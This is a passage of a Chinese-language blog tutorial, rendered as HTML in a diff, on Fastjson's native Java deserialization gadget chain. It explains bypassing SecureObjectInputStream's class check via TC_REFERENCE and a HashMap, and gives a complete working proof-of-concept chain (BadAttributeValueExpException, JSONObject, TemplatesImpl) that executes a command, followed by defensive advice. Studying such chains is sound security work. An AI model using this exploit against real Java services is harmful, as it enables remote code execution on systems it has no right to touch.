+</span></span><span style="display:flex;"><span>        <span style="color:#c678dd">case</span> <span style="color:#e06c75">TC_LONGSTRING</span><span style="color:#56b6c2">:</span>
+</span></span><span style="display:flex;"><span>            <span style="color:#c678dd">return</span> <span style="color:#e06c75">checkResolve</span><span style="color:#56b6c2">(</span><span style="color:#e06c75">readString</span><span style="color:#56b6c2">(</span><span style="color:#e06c75">unshared</span><span style="color:#56b6c2">));</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        <span style="color:#c678dd">case</span> <span style="color:#e06c75">TC_ARRAY</span><span style="color:#56b6c2">:</span>
+</span></span><span style="display:flex;"><span>            <span style="color:#c678dd">return</span> <span style="color:#e06c75">checkResolve</span><span style="color:#56b6c2">(</span><span style="color:#e06c75">readArray</span><span style="color:#56b6c2">(</span><span style="color:#e06c75">unshared</span><span style="color:#56b6c2">));</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        <span style="color:#c678dd">case</span> <span style="color:#e06c75">TC_ENUM</span><span style="color:#56b6c2">:</span>
+</span></span><span style="display:flex;"><span>            <span style="color:#c678dd">return</span> <span style="color:#e06c75">checkResolve</span><span style="color:#56b6c2">(</span><span style="color:#e06c75">readEnum</span><span style="color:#56b6c2">(</span><span style="color:#e06c75">unshared</span><span style="color:#56b6c2">));</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        <span style="color:#c678dd">case</span> <span style="color:#e06c75">TC_OBJECT</span><span style="color:#56b6c2">:</span>
+</span></span><span style="display:flex;"><span>            <span style="color:#c678dd">return</span> <span style="color:#e06c75">checkResolve</span><span style="color:#56b6c2">(</span><span style="color:#e06c75">readOrdinaryObject</span><span style="color:#56b6c2">(</span><span style="color:#e06c75">unshared</span><span style="color:#56b6c2">));</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        <span style="color:#c678dd">case</span> <span style="color:#e06c75">TC_EXCEPTION</span><span style="color:#56b6c2">:</span>
+</span></span><span style="display:flex;"><span>            <span style="color:#e06c75">IOException</span> <span style="color:#e06c75">ex</span> <span style="color:#56b6c2">=</span> <span style="color:#e06c75">readFatalException</span><span style="color:#56b6c2">();</span>
+</span></span><span style="display:flex;"><span>            <span style="color:#c678dd">throw</span> <span style="color:#c678dd">new</span> <span style="color:#e06c75">WriteAbortedException</span><span style="color:#56b6c2">(</span><span style="color:#98c379">&#34;writing aborted&#34;</span><span style="color:#56b6c2">,</span> <span style="color:#e06c75">ex</span><span style="color:#56b6c2">);</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        <span style="color:#c678dd">case</span> <span style="color:#e06c75">TC_BLOCKDATA</span><span style="color:#56b6c2">:</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#c678dd">case</span> <span style="color:#e06c75">TC_BLOCKDATALONG</span><span style="color:#56b6c2">:</span>
+</span></span><span style="display:flex;"><span>            <span style="color:#c678dd">if</span> <span style="color:#56b6c2">(</span><span style="color:#e06c75">oldMode</span><span style="color:#56b6c2">)</span> <span style="color:#56b6c2">{</span>
+</span></span><span style="display:flex;"><span>                <span style="color:#e06c75">bin</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">setBlockDataMode</span><span style="color:#56b6c2">(</span><span style="color:#e5c07b">true</span><span style="color:#56b6c2">);</span>
+</span></span><span style="display:flex;"><span>                <span style="color:#e06c75">bin</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">peek</span><span style="color:#56b6c2">();</span>             <span style="color:#7f848e">// force header read
+</span></span></span><span style="display:flex;"><span><span style="color:#7f848e"></span>                <span style="color:#c678dd">throw</span> <span style="color:#c678dd">new</span> <span style="color:#e06c75">OptionalDataException</span><span style="color:#56b6c2">(</span>
+</span></span><span style="display:flex;"><span>                    <span style="color:#e06c75">bin</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">currentBlockRemaining</span><span style="color:#56b6c2">());</span>
+</span></span><span style="display:flex;"><span>            <span style="color:#56b6c2">}</span> <span style="color:#c678dd">else</span> <span style="color:#56b6c2">{</span>
+</span></span><span style="display:flex;"><span>                <span style="color:#c678dd">throw</span> <span style="color:#c678dd">new</span> <span style="color:#e06c75">StreamCorruptedException</span><span style="color:#56b6c2">(</span>
+</span></span><span style="display:flex;"><span>                    <span style="color:#98c379">&#34;unexpected block data&#34;</span><span style="color:#56b6c2">);</span>
+</span></span><span style="display:flex;"><span>            <span style="color:#56b6c2">}</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        <span style="color:#c678dd">case</span> <span style="color:#e06c75">TC_ENDBLOCKDATA</span><span style="color:#56b6c2">:</span>
+</span></span><span style="display:flex;"><span>            <span style="color:#c678dd">if</span> <span style="color:#56b6c2">(</span><span style="color:#e06c75">oldMode</span><span style="color:#56b6c2">)</span> <span style="color:#56b6c2">{</span>
+</span></span><span style="display:flex;"><span>                <span style="color:#c678dd">throw</span> <span style="color:#c678dd">new</span> <span style="color:#e06c75">OptionalDataException</span><span style="color:#56b6c2">(</span><span style="color:#e5c07b">true</span><span style="color:#56b6c2">);</span>
+</span></span><span style="display:flex;"><span>            <span style="color:#56b6c2">}</span> <span style="color:#c678dd">else</span> <span style="color:#56b6c2">{</span>
+</span></span><span style="display:flex;"><span>                <span style="color:#c678dd">throw</span> <span style="color:#c678dd">new</span> <span style="color:#e06c75">StreamCorruptedException</span><span style="color:#56b6c2">(</span>
+</span></span><span style="display:flex;"><span>                    <span style="color:#98c379">&#34;unexpected end of block data&#34;</span><span style="color:#56b6c2">);</span>
+</span></span><span style="display:flex;"><span>            <span style="color:#56b6c2">}</span>
+</span></span><span style="display:flex;"><span><span style="color:#e06c75">
+</span></span></span><span style="display:flex;"><span><span style="color:#e06c75">        default:</span>
+</span></span><span style="display:flex;"><span>            <span style="color:#c678dd">throw</span> <span style="color:#c678dd">new</span> <span style="color:#e06c75">StreamCorruptedException</span><span style="color:#56b6c2">(</span>
+</span></span><span style="display:flex;"><span>                <span style="color:#e06c75">String</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">format</span><span style="color:#56b6c2">(</span><span style="color:#98c379">&#34;invalid type code: %02X&#34;</span><span style="color:#56b6c2">,</span> <span style="color:#e06c75">tc</span><span style="color:#56b6c2">));</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#56b6c2">}</span>
+</span></span></code></pre></div><p>发现 <code>TC_NULL、TC_REFERENCE、TC_LONGSTRING、TC_EXCEPTION、TC_BLOCKDATALONG、TC_ENDBLOCKDATA</code> 不会调用 <code>resolveClass</code> 和 <code>resolveProxyClass</code> ，再经筛选，发现<code>TC_REFERENCE</code> 符合要求</p>
+<p><code>TC_REFERENCE</code> 表示引用，利用分配的 <code>newHandle</code> 地址引用已完成反序列化的对象。之前学过的 JDK8u20链就是通过成员抛弃机制搭配 <code>TC_REFERENCE</code> 绕过 <code>AnnocationInvocationHandler</code> 的异常处理</p>
+<p>分析前面构造的链子</p>
+<pre tabindex="0"><code>BadAttributeValueExpException#readObject() -&gt; JSONObject#toString() -&gt; TemplatesImpl#getOutputProperties()
+</code></pre><p><code>SecureObjectInputStream#resolveClass</code>、<code>SecureObjectInputStream#resolveProxyClass</code> 阻止的是 <code>TemplatesImpl</code></p>
+<p>那我们可以先把 <code>TemplatesImpl</code> 反序列化出来，然后利用 <code>TC_REFERENCE</code> 将 <code>TemplatesImpl</code> 的引用地址插入到 <code>JSONObject</code> 的 <code>value</code> 值中，从而绕过拦截</p>
+<p>接下来寻找能够反序列化多个对象的存储类，很自然的想到<code>HashMap</code>，<code>HashMap</code>肯定会反序列化出<code>key</code>和<code>value</code>（前面的<code>AntiCollisionHashMap</code> 也不错，不过没<code>HashMap</code> 通用）</p>
+<div class="highlight"><pre tabindex="0" style="color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span>    <span style="color:#c678dd">private</span> <span style="color:#e5c07b">void</span> <span style="color:#61afef;font-weight:bold">readObject</span><span style="color:#56b6c2">(</span><span style="color:#e06c75">java</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">io</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">ObjectInputStream</span> <span style="color:#e06c75">s</span><span style="color:#56b6c2">)</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#c678dd">throws</span> <span style="color:#e06c75">IOException</span><span style="color:#56b6c2">,</span> <span style="color:#e06c75">ClassNotFoundException</span> <span style="color:#56b6c2">{</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#7f848e">// Read in the threshold (ignored), loadfactor, and any hidden stuff
+</span></span></span><span style="display:flex;"><span><span style="color:#7f848e"></span>        <span style="color:#e06c75">s</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">defaultReadObject</span><span style="color:#56b6c2">();</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#e06c75">reinitialize</span><span style="color:#56b6c2">();</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#56b6c2">...</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>            <span style="color:#7f848e">// Read the keys and values, and put the mappings in the HashMap
+</span></span></span><span style="display:flex;"><span><span style="color:#7f848e"></span>            <span style="color:#c678dd">for</span> <span style="color:#56b6c2">(</span><span style="color:#e5c07b">int</span> <span style="color:#e06c75">i</span> <span style="color:#56b6c2">=</span> <span style="color:#d19a66">0</span><span style="color:#56b6c2">;</span> <span style="color:#e06c75">i</span> <span style="color:#56b6c2">&lt;</span> <span style="color:#e06c75">mappings</span><span style="color:#56b6c2">;</span> <span style="color:#e06c75">i</span><span style="color:#56b6c2">++)</span> <span style="color:#56b6c2">{</span>
+</span></span><span style="display:flex;"><span>                <span style="color:#61afef">@SuppressWarnings</span><span style="color:#56b6c2">(</span><span style="color:#98c379">&#34;unchecked&#34;</span><span style="color:#56b6c2">)</span>
+</span></span><span style="display:flex;"><span>                    <span style="color:#e06c75">K</span> <span style="color:#e06c75">key</span> <span style="color:#56b6c2">=</span> <span style="color:#56b6c2">(</span><span style="color:#e06c75">K</span><span style="color:#56b6c2">)</span> <span style="color:#e06c75">s</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">readObject</span><span style="color:#56b6c2">();</span>
+</span></span><span style="display:flex;"><span>                <span style="color:#61afef">@SuppressWarnings</span><span style="color:#56b6c2">(</span><span style="color:#98c379">&#34;unchecked&#34;</span><span style="color:#56b6c2">)</span>
+</span></span><span style="display:flex;"><span>                    <span style="color:#e06c75">V</span> <span style="color:#e06c75">value</span> <span style="color:#56b6c2">=</span> <span style="color:#56b6c2">(</span><span style="color:#e06c75">V</span><span style="color:#56b6c2">)</span> <span style="color:#e06c75">s</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">readObject</span><span style="color:#56b6c2">();</span>
+</span></span><span style="display:flex;"><span>                <span style="color:#e06c75">putVal</span><span style="color:#56b6c2">(</span><span style="color:#e06c75">hash</span><span style="color:#56b6c2">(</span><span style="color:#e06c75">key</span><span style="color:#56b6c2">),</span> <span style="color:#e06c75">key</span><span style="color:#56b6c2">,</span> <span style="color:#e06c75">value</span><span style="color:#56b6c2">,</span> <span style="color:#e5c07b">false</span><span style="color:#56b6c2">,</span> <span style="color:#e5c07b">false</span><span style="color:#56b6c2">);</span>
+</span></span><span style="display:flex;"><span>            <span style="color:#56b6c2">}</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#56b6c2">}</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#56b6c2">}</span>
+</span></span></code></pre></div><h4 id="poc-1">POC</h4>
+<div class="highlight"><pre tabindex="0" style="color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span><span style="color:#c678dd">import</span> <span style="color:#e06c75">com.alibaba.fastjson.JSONObject</span><span style="color:#56b6c2">;</span>
+</span></span><span style="display:flex;"><span><span style="color:#c678dd">import</span> <span style="color:#e06c75">com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet</span><span style="color:#56b6c2">;</span>
+</span></span><span style="display:flex;"><span><span style="color:#c678dd">import</span> <span style="color:#e06c75">com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl</span><span style="color:#56b6c2">;</span>
+</span></span><span style="display:flex;"><span><span style="color:#c678dd">import</span> <span style="color:#e06c75">javassist.*</span><span style="color:#56b6c2">;</span>
+</span></span><span style="display:flex;"><span><span style="color:#c678dd">import</span> <span style="color:#e06c75">javax.management.BadAttributeValueExpException</span><span style="color:#56b6c2">;</span>
+</span></span><span style="display:flex;"><span><span style="color:#c678dd">import</span> <span style="color:#e06c75">java.io.*</span><span style="color:#56b6c2">;</span>
+</span></span><span style="display:flex;"><span><span style="color:#c678dd">import</span> <span style="color:#e06c75">java.lang.reflect.Field</span><span style="color:#56b6c2">;</span>
+</span></span><span style="display:flex;"><span><span style="color:#c678dd">import</span> <span style="color:#e06c75">java.util.HashMap</span><span style="color:#56b6c2">;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#c678dd">public</span> <span style="color:#c678dd">class</span> <span style="color:#e5c07b">FastjsonUnserialize</span> <span style="color:#56b6c2">{</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#c678dd">public</span> <span style="color:#c678dd">static</span> <span style="color:#e5c07b">void</span> <span style="color:#61afef;font-weight:bold">main</span><span style="color:#56b6c2">(</span><span style="color:#e06c75">String</span><span style="color:#56b6c2">[]</span> <span style="color:#e06c75">args</span><span style="color:#56b6c2">)</span> <span style="color:#c678dd">throws</span> <span style="color:#e06c75">CannotCompileException</span><span style="color:#56b6c2">,</span> <span style="color:#e06c75">NotFoundException</span><span style="color:#56b6c2">,</span> <span style="color:#e06c75">IOException</span><span style="color:#56b6c2">,</span> <span style="color:#e06c75">InstantiationException</span><span style="color:#56b6c2">,</span> <span style="color:#e06c75">IllegalAccessException</span><span style="color:#56b6c2">,</span> <span style="color:#e06c75">NoSuchFieldException</span><span style="color:#56b6c2">,</span> <span style="color:#e06c75">ClassNotFoundException</span> <span style="color:#56b6c2">{</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#e06c75">String</span> <span style="color:#e06c75">codes</span> <span style="color:#56b6c2">=</span> <span style="color:#98c379">&#34;java.lang.Runtime.getRuntime().exec(\&#34;calc\&#34;);&#34;</span><span style="color:#56b6c2">;</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#e06c75">ClassPool</span> <span style="color:#e06c75">pool</span> <span style="color:#56b6c2">=</span> <span style="color:#e06c75">ClassPool</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">getDefault</span><span style="color:#56b6c2">();</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#e06c75">CtClass</span> <span style="color:#e06c75">cc</span> <span style="color:#56b6c2">=</span> <span style="color:#e06c75">pool</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">makeClass</span><span style="color:#56b6c2">(</span><span style="color:#98c379">&#34;hhh&#34;</span><span style="color:#56b6c2">);</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        <span style="color:#e06c75">cc</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">makeClassInitializer</span><span style="color:#56b6c2">().</span><span style="color:#e06c75">insertBefore</span><span style="color:#56b6c2">(</span><span style="color:#e06c75">codes</span><span style="color:#56b6c2">);</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#e06c75">cc</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">setSuperclass</span><span style="color:#56b6c2">((</span><span style="color:#e06c75">pool</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">get</span><span style="color:#56b6c2">(</span><span style="color:#e06c75">AbstractTranslet</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">class</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">getName</span><span style="color:#56b6c2">())));</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#e5c07b">byte</span><span style="color:#56b6c2">[]</span> <span style="color:#e06c75">bytecodes</span> <span style="color:#56b6c2">=</span> <span style="color:#e06c75">cc</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">toBytecode</span><span style="color:#56b6c2">();</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        <span style="color:#e06c75">TemplatesImpl</span> <span style="color:#e06c75">templates</span> <span style="color:#56b6c2">=</span> <span style="color:#c678dd">new</span> <span style="color:#e06c75">TemplatesImpl</span><span style="color:#56b6c2">();</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#e06c75">Class</span> <span style="color:#e06c75">tc</span> <span style="color:#56b6c2">=</span> <span style="color:#e06c75">templates</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">getClass</span><span style="color:#56b6c2">();</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#e06c75">Field</span> <span style="color:#e06c75">nameField</span> <span style="color:#56b6c2">=</span> <span style="color:#e06c75">tc</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">getDeclaredField</span><span style="color:#56b6c2">(</span><span style="color:#98c379">&#34;_name&#34;</span><span style="color:#56b6c2">);</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#e06c75">nameField</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">setAccessible</span><span style="color:#56b6c2">(</span><span style="color:#e5c07b">true</span><span style="color:#56b6c2">);</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#e06c75">nameField</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">set</span><span style="color:#56b6c2">(</span><span style="color:#e06c75">templates</span><span style="color:#56b6c2">,</span><span style="color:#98c379">&#34;a&#34;</span><span style="color:#56b6c2">);</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#e06c75">Field</span> <span style="color:#e06c75">bytecodesField</span> <span style="color:#56b6c2">=</span> <span style="color:#e06c75">tc</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">getDeclaredField</span><span style="color:#56b6c2">(</span><span style="color:#98c379">&#34;_bytecodes&#34;</span><span style="color:#56b6c2">);</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#e06c75">bytecodesField</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">setAccessible</span><span style="color:#56b6c2">(</span><span style="color:#e5c07b">true</span><span style="color:#56b6c2">);</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#e5c07b">byte</span><span style="color:#56b6c2">[][]</span> <span style="color:#e06c75">bytes</span> <span style="color:#56b6c2">=</span> <span style="color:#c678dd">new</span> <span style="color:#e5c07b">byte</span><span style="color:#56b6c2">[][]{</span><span style="color:#e06c75">bytecodes</span><span style="color:#56b6c2">};</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#e06c75">bytecodesField</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">set</span><span style="color:#56b6c2">(</span><span style="color:#e06c75">templates</span><span style="color:#56b6c2">,</span><span style="color:#e06c75">bytes</span><span style="color:#56b6c2">);</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        <span style="color:#e06c75">JSONObject</span> <span style="color:#e06c75">jsonObject</span> <span style="color:#56b6c2">=</span> <span style="color:#c678dd">new</span> <span style="color:#e06c75">JSONObject</span><span style="color:#56b6c2">();</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#e06c75">jsonObject</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">put</span><span style="color:#56b6c2">(</span><span style="color:#98c379">&#34;aaa&#34;</span><span style="color:#56b6c2">,</span> <span style="color:#e06c75">templates</span><span style="color:#56b6c2">);</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#7f848e">// writeObject第二次写入templates, 由于是同一个对象, 因此使用 TC_REFERENCE 引用 templates 的 newHandle
+</span></span></span><span style="display:flex;"><span><span style="color:#7f848e"></span>
+</span></span><span style="display:flex;"><span>        <span style="color:#e06c75">Class</span><span style="color:#56b6c2">&lt;?&gt;</span> <span style="color:#e06c75">badClass</span> <span style="color:#56b6c2">=</span> <span style="color:#e06c75">Class</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">forName</span><span style="color:#56b6c2">(</span><span style="color:#98c379">&#34;javax.management.BadAttributeValueExpException&#34;</span><span style="color:#56b6c2">);</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#e06c75">BadAttributeValueExpException</span> <span style="color:#e06c75">bad</span> <span style="color:#56b6c2">=</span> <span style="color:#c678dd">new</span> <span style="color:#e06c75">BadAttributeValueExpException</span><span style="color:#56b6c2">(</span><span style="color:#e5c07b">null</span><span style="color:#56b6c2">);</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#e06c75">Field</span> <span style="color:#e06c75">valField</span> <span style="color:#56b6c2">=</span> <span style="color:#e06c75">badClass</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">getDeclaredField</span><span style="color:#56b6c2">(</span><span style="color:#98c379">&#34;val&#34;</span><span style="color:#56b6c2">);</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#e06c75">valField</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">setAccessible</span><span style="color:#56b6c2">(</span><span style="color:#e5c07b">true</span><span style="color:#56b6c2">);</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#e06c75">valField</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">set</span><span style="color:#56b6c2">(</span><span style="color:#e06c75">bad</span><span style="color:#56b6c2">,</span> <span style="color:#e06c75">jsonObject</span><span style="color:#56b6c2">);</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        <span style="color:#e06c75">HashMap</span><span style="color:#56b6c2">&lt;</span><span style="color:#e06c75">Object</span><span style="color:#56b6c2">,</span> <span style="color:#e06c75">Object</span><span style="color:#56b6c2">&gt;</span> <span style="color:#e06c75">map</span> <span style="color:#56b6c2">=</span> <span style="color:#c678dd">new</span> <span style="color:#e06c75">HashMap</span><span style="color:#56b6c2">&lt;&gt;();</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#e06c75">map</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">put</span><span style="color:#56b6c2">(</span><span style="color:#e06c75">templates</span><span style="color:#56b6c2">,</span> <span style="color:#e06c75">bad</span><span style="color:#56b6c2">);</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#7f848e">// writeObject第一次写入templates
+</span></span></span><span style="display:flex;"><span><span style="color:#7f848e"></span>
+</span></span><span style="display:flex;"><span>        <span style="color:#e06c75">ByteArrayOutputStream</span> <span style="color:#e06c75">byteArrayOutputStream</span> <span style="color:#56b6c2">=</span> <span style="color:#c678dd">new</span> <span style="color:#e06c75">ByteArrayOutputStream</span><span style="color:#56b6c2">();</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#e06c75">ObjectOutputStream</span> <span style="color:#e06c75">objectOutputStream</span> <span style="color:#56b6c2">=</span> <span style="color:#c678dd">new</span> <span style="color:#e06c75">ObjectOutputStream</span><span style="color:#56b6c2">(</span><span style="color:#e06c75">byteArrayOutputStream</span><span style="color:#56b6c2">);</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#e06c75">objectOutputStream</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">writeObject</span><span style="color:#56b6c2">(</span><span style="color:#e06c75">map</span><span style="color:#56b6c2">);</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        <span style="color:#e06c75">ByteArrayInputStream</span> <span style="color:#e06c75">byteArrayInputStream</span> <span style="color:#56b6c2">=</span> <span style="color:#c678dd">new</span> <span style="color:#e06c75">ByteArrayInputStream</span><span style="color:#56b6c2">(</span><span style="color:#e06c75">byteArrayOutputStream</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">toByteArray</span><span style="color:#56b6c2">());</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#e06c75">ObjectInputStream</span> <span style="color:#e06c75">objectInputStream</span> <span style="color:#56b6c2">=</span> <span style="color:#c678dd">new</span> <span style="color:#e06c75">ObjectInputStream</span><span style="color:#56b6c2">(</span><span style="color:#e06c75">byteArrayInputStream</span><span style="color:#56b6c2">);</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#e06c75">objectInputStream</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">readObject</span><span style="color:#56b6c2">();</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#56b6c2">}</span>
+</span></span><span style="display:flex;"><span><span style="color:#56b6c2">}</span>
+</span></span></code></pre></div><h3 id="0x03-后记">0x03 后记</h3>
+<p>学习完Fastjson原生链，深刻地体会到什么叫没有绝对的安全。要想在业务中安全地实现反序列化，开发者绝不能期望组件能托管业务的全流程，完全依赖组件的安全特性，必须构建安全的SecureInputStream，从源头阻止恶意类被反序列化</p>
+<div class="highlight"><pre tabindex="0" style="color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span><span style="color:#c678dd">import</span> <span style="color:#e06c75">java.io.IOException</span><span style="color:#56b6c2">;</span>
+</span></span><span style="display:flex;"><span><span style="color:#c678dd">import</span> <span style="color:#e06c75">java.io.InputStream</span><span style="color:#56b6c2">;</span>
+</span></span><span style="display:flex;"><span><span style="color:#c678dd">import</span> <span style="color:#e06c75">java.io.ObjectInputStream</span><span style="color:#56b6c2">;</span>
+</span></span><span style="display:flex;"><span><span style="color:#c678dd">import</span> <span style="color:#e06c75">java.io.ObjectStreamClass</span><span style="color:#56b6c2">;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#c678dd">public</span> <span style="color:#c678dd">class</span> <span style="color:#e5c07b">SecureInputStream</span> <span style="color:#c678dd">extends</span> <span style="color:#e06c75">ObjectInputStream</span> <span style="color:#56b6c2">{</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#61afef">@Override</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#c678dd">protected</span> <span style="color:#e06c75">Class</span><span style="color:#56b6c2">&lt;?&gt;</span> <span style="color:#e06c75">resolveClass</span><span style="color:#56b6c2">(</span><span style="color:#e06c75">ObjectStreamClass</span> <span style="color:#e06c75">desc</span><span style="color:#56b6c2">)</span> <span style="color:#c678dd">throws</span> <span style="color:#e06c75">IOException</span><span style="color:#56b6c2">,</span> <span style="color:#e06c75">ClassNotFoundException</span> <span style="color:#56b6c2">{</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#7f848e">// 可靠的 WAF
+</span></span></span><span style="display:flex;"><span><span style="color:#7f848e"></span>        <span style="color:#c678dd">return</span> <span style="color:#c678dd">super</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">resolveClass</span><span style="color:#56b6c2">(</span><span style="color:#e06c75">desc</span><span style="color:#56b6c2">);</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#56b6c2">}</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#61afef">@Override</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#c678dd">protected</span> <span style="color:#e06c75">Class</span><span style="color:#56b6c2">&lt;?&gt;</span> <span style="color:#e06c75">resolveProxyClass</span><span style="color:#56b6c2">(</span><span style="color:#e06c75">String</span><span style="color:#56b6c2">[]</span> <span style="color:#e06c75">interfaces</span><span style="color:#56b6c2">)</span> <span style="color:#c678dd">throws</span> <span style="color:#e06c75">IOException</span><span style="color:#56b6c2">,</span> <span style="color:#e06c75">ClassNotFoundException</span> <span style="color:#56b6c2">{</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#7f848e">// 可靠的 WAF
+</span></span></span><span style="display:flex;"><span><span style="color:#7f848e"></span>        <span style="color:#c678dd">return</span> <span style="color:#c678dd">super</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">resolveProxyClass</span><span style="color:#56b6c2">(</span><span style="color:#e06c75">interfaces</span><span style="color:#56b6c2">);</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#56b6c2">}</span>
+</span></span><span style="display:flex;"><span><span style="color:#56b6c2">}</span>
+</span></span></code></pre></div><p><strong>安全的反序列化流程</strong></p>
+<div class="highlight"><pre tabindex="0" style="color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span><span style="color:#7f848e">// ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();
+</span></span></span><span style="display:flex;"><span><span style="color:#7f848e">// ObjectOutputStream objectOutputStream = new ObjectOutputStream(byteArrayOutputStream);
+</span></span></span><span style="display:flex;"><span><span style="color:#7f848e">// objectOutputStream.writeObject(bad);
+</span></span></span><span style="display:flex;"><span><span style="color:#7f848e"></span>
+</span></span><span style="display:flex;"><span><span style="color:#e06c75">ByteArrayInputStream</span> <span style="color:#e06c75">byteArrayInputStream</span> <span style="color:#56b6c2">=</span> <span style="color:#c678dd">new</span> <span style="color:#e06c75">ByteArrayInputStream</span><span style="color:#56b6c2">(</span><span style="color:#e06c75">byteArrayOutputStream</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">toByteArray</span><span style="color:#56b6c2">());</span>
+</span></span><span style="display:flex;"><span><span style="color:#e06c75">SecureInputStream</span> <span style="color:#e06c75">secureInputStream</span> <span style="color:#56b6c2">=</span> <span style="color:#c678dd">new</span> <span style="color:#e06c75">SecureInputStream</span><span style="color:#56b6c2">(</span><span style="color:#e06c75">byteArrayInputStream</span><span style="color:#56b6c2">);</span>
+</span></span><span style="display:flex;"><span><span style="color:#e06c75">secureInputStream</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">readObject</span><span style="color:#56b6c2">();</span>
+</span></span></code></pre></div><h2 id="附录">附录</h2>
